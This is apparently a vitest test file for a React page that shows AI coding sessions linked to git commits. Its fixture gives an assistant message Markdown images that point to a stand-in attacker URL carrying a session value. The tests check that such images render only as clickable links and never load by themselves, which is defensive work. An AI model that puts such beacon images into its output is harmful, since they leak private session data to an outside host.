import { assert, describe, it } from "@effect/vitest";
import { renderToStaticMarkup } from "react-dom/server";

import type { LedgerRange } from "../core/ledger.ts";

const BEACON = "https://attacker.example/seen?session=private-client";

const range: LedgerRange = {
  repo: "acme/backend",
  range: "main..HEAD",
  remoteUrl: null,
  commits: [
    {
      commit: {
        sha: "a".repeat(40),
        subject: "feat: a",
        committedAt: "2026-01-01T10:00:00Z",
        patchId: null,
      },
      matchedBy: "sha",
      entry: {
        formatVersion: 2,
        commit: {
          sha: "a".repeat(40),
          subject: "feat: a",
          committedAt: "2026-01-01T10:00:00Z",
          patchId: null,
        },
        links: [
          {
            thread: {
              id: "t1",
              title: "Do it",
              source: "codex",
              provider: null,
              origin: null,
              parent: null,
            },
            role: "coder",
            via: "sha",
            reviewedSha: null,
            files: ["src/a.ts"],
            labels: {},
            entries: [
              {
                type: "message",
                id: "m0",
                at: "2026-01-01T09:58:00Z",
                role: "user",
                text: "Do it",
              },
              {
                type: "message",
                id: "m1",
                at: "2026-01-01T09:59:00Z",
                role: "assistant",
                text: `Done. ![x](${BEACON}) and ![](${BEACON}&2)`,
              },
            ],
          },
          {
            thread: {
              id: "t2",
              title: "Review it",
              source: "t3",
              provider: "codex",
              origin: null,
              parent: null,
            },
            role: "reviewer",
            via: "asserted",
            reviewedSha: "b".repeat(40),
            files: [],
            labels: {},
            entries: [],
          },
        ],
        unlinked: [],
        files: [
          { path: "src/a.ts", bucket: "attributed" },
          { path: "src/b.css", bucket: "untracked" },
        ],
        notes: [{ text: "b.css by hand", file: "src/b.css", at: "2026-01-01T11:00:00Z" }],
        outputs: "included",
        redactions: 0,
      },
    },
  ],
};

describe("static ledger page", () => {
  it("shows Markdown images in session text as links, so nothing loads by itself", async () => {
    // client.ts builds its API client from `location` on import; the static page never calls it.
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(
      <LedgerPage repo={range.repo} range={range.range} inline={range} />,
    );
    assert.include(html, "Done.", "the message is rendered");
    assert.notMatch(html, /<img\b/i);
    assert.include(html, `href="${BEACON.replace("&", "&amp;")}"`, "kept as a link to click");
  });

  it("shows every linked thread with its role, stale reviews, file buckets and notes", async () => {
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(
      <LedgerPage repo={range.repo} range={range.range} inline={range} />,
    );
    for (const text of ["Do it", "Review it", "reviewer", "stale: reviewed bbbbbbbb", "untracked"])
      assert.include(html, text);
    assert.include(html, "b.css by hand");
  });
});
